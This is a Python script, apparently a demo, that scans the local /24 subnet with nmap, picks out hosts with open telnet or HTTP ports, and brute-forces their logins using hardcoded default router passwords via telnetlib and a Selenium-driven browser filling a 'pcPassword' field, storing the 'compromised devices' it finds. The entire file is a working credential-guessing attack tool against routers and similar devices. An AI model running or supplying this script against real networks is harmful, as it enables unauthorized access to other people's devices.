import re
import socket
import telnetlib
import os

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from subprocess import PIPE, run

def cmdline(command):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    return result.stdout

# Get ip address of device. Only works for OSX
ip_address = cmdline("ipconfig getifaddr en0").rstrip()

# Run nmap command and store ip addresses and port details
command = "nmap {}/24 | egrep 'Nmap scan report|telnet|http'".format(ip_address)
print(command)
result = cmdline(command)

# Testing purposes:
# result = open('109_2.txt', 'r')

# Convert nmap result into a nice dictionary
ip_mappings = {}
previous = None
# Testing purposes:
# for line in result:
for line in result.splitlines()[1:]:
    ip_search = re.search( r'[0-9]+(?:\.[0-9]+){3}', line)
    if ip_search:
        previous = ip_search.group(0)
        ip_mappings[previous] = []
    else:
        port_details = line.split()
        port_number = port_details[0].split('/')[0]
        port_service = port_details[2]
        ip_mappings[previous].append({"port_service": port_service, "port_number" : port_number})

# Commonly used username and passwords
# Sourced from: https://proprivacy.com/guides/default-router-login-details
# Currently hardcoded and minimal due to demo purposes.
usernames = ['admin']
passwords = ['fku123', 'admin', 'password']

# Compromised devices storage
storage = {}

# Go through ip address mappings of open telnet ports
# Try each open port with most common username and passwords
print('Starting brute force')
for ip_address in ip_mappings:
    for port_details in ip_mappings[ip_address]:
        port_number = port_details['port_number']
        port_service = port_details['port_service']
        
        print('Brute forcing {} {}'.format(ip_address, port_number))
        if port_service == 'telnet':
            print('Trying socket...')
            for password in passwords:
                try:
                    tn = telnetlib.Telnet(ip_address, port_number, timeout=2)
                    tn.read_until(b"password:", timeout=1)
                    tn.write(password.encode('ascii') + b"\n")
                    tn.write(b"logout\n")
                    evidence = tn.read_all().decode('ascii')
                    storage[ip_address + ':' + port_number] = password
                    break
                except:
                    continue
        elif port_service == 'http' or port_service == 'https':
            driver = webdriver.Chrome()
            for password in passwords:
                driver.get("{}://{}:{}".format(port_service, ip_address, port_number))
                try:
                    elem = driver.find_element_by_id("pcPassword")
                    elem.clear()
                    elem.send_keys(password)
                    elem.send_keys(Keys.RETURN)
                    try:
                        driver.find_element_by_id("pcPassword")
                    except:
                        storage[ip_address + ':' + port_number] = password
                        break
                except:
                    continue
            driver.close()

print(storage)